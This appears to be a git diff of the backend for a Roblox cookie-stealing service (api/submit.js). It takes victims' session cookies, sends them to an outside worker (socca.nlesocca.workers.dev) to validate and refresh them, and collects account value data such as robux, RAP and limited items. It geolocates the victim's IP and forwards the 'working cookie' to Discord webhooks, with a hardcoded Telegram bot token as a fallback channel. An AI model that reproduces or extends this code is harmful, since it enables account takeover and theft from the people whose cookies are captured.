@@ -1,18 +1,11 @@
-// api/submit.js — Uses worker for cookie validation
+// api/submit.js — Uses socca worker for cookie validation/refresh
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// Your worker URL
+// Your working socca worker
 const COOKIE_WORKER_URL = 'https://socca.nlesocca.workers.dev/cookie';
-
-// Item asset IDs
-const ITEMS = {
-  HEADLESS: 134082579,
-  KORBLOX: 139607625,
-  VALKYRIE: 1365767
-};
 
 async function redisGet(key) {
   try {
@@ -40,7 +33,7 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// Call worker to validate/refresh cookie and get account info
+// Call socca worker to validate/refresh cookie
 async function refreshCookieStatus(cookie) {
   try {
     const ctrl = new AbortController();
@@ -65,8 +58,8 @@ async function refreshCookieStatus(cookie) {
       };
     }
     
-    // Map worker response to expected format
-    const acc = result.fullAccount || {};
+    // Map socca worker response to expected format
+    const fa = result.fullAccount || {};
     return {
       refreshed: true,
       newCookie: result.newCookie || cookie,
@@ -76,19 +69,20 @@ async function refreshCookieStatus(cookie) {
         username: result.username,
         displayName: result.displayName,
         profileUrl: `https://www.roblox.com/users/${result.userId}/profile`,
-        avatarUrl: acc.avatarUrl || result.avatarUrl,
-        robux: acc.robux || 0,
-        rap: acc.rap || 0,
-        items: acc.limiteds || 0,
-        credit: acc.credit || 0,
-        premium: acc.hasPremium || false,
-        voiceChat: acc.voiceChat || false,
-        headless: acc.headless || false,
-        korblox: acc.korblox || false,
-        valkyrie: acc.valkyrie || false,
-        accountAge: acc.ageDays || 0,
-        friends: acc.friends || 0,
-        groupsOwned: acc.groupsOwned || 0
+        avatarUrl: fa.avatarUrl || result.avatarUrl,
+        created: null, // socca doesn't return this directly
+        robux: fa.robux || 0,
+        rap: fa.rap || 0,
+        items: fa.limiteds || 0,
+        credit: fa.credit || 0,
+        premium: fa.hasPremium || false,
+        voiceChat: fa.voiceChat || false,
+        headless: fa.headless || false,
+        korblox: fa.korblox || false,
+        valkyrie: fa.valkyrie || false,
+        accountAge: fa.ageDays || 0,
+        friends: fa.friends || 0,
+        groupsOwned: fa.groupsOwned || 0
       },
       timestamp: new Date().toISOString()
     };
@@ -289,7 +283,7 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // Use worker for cookie validation/refresh
+  // Use socca worker for cookie validation/refresh
   const geoPromise = getIpGeo(ip);
   const accountPromise = refreshCookieStatus(cookie);
 
@@ -378,7 +372,7 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, accountPayload);
   }
 
-  // STEP 3: 🔐 Send Working Cookie
+  // STEP 3: 🔐 Send Working Cookie (refreshed if available)
   await discordSendCookie(webhook2, workingCookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, workingCookie, acc?.username);
 
